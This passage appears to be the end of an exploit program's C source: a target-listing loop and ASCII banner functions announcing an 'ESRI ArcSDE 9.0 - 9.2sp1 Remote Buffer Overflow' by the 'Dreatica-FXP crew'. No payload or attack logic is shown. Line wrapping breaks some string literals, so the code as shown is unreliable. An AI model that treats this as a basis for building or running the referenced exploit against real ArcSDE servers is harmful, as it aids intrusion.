	for(int j=0; targets[j].t!=0;j++)
	{
		printf("       %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" 
####################################################################### 
\n");	
	printf(" #     ____                 __  _                  
______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / 
__/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    
\\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    
/  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     
/_/\\_\\/_/       #\n");
	printf(" #                                 crew                                
#\n");
	printf(" 
####################################################################### 
\n");	
	printf(" #  Exploit : ESRI ArcSDE 9.0 - 9.2sp1 Remote Buffer 
Overflow          # \n");
	printf(" #  Solution: ESRI ArcSDE 9.2 sp2 is invulnerable                      
# \n");
	printf(" #  Author  : Heretic2 (heretic2x@gmail.com                            
# \n");
	printf(" #  THANKS  : iDefense, Zero-tolerance, Metasploit 
project and anghell # \n");
	printf(" #  Research: iDefense                                                 
# \n");
	printf(" #  Version : 1.0 Public Release                                       
# \n");
	printf(" #  System  : Windows ALL                                              
# \n");
	printf(" #  Date    : 26.06.2007                                               
# \n");
	printf(" # 
------------------------------------------------------------------- # 
\n");
}

void end_logo()
{
	printf(" # 
------------------------------------------------------------------- # 
\n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     
# \n");	
	printf(" 
####################################################################### 
\n\n");
}

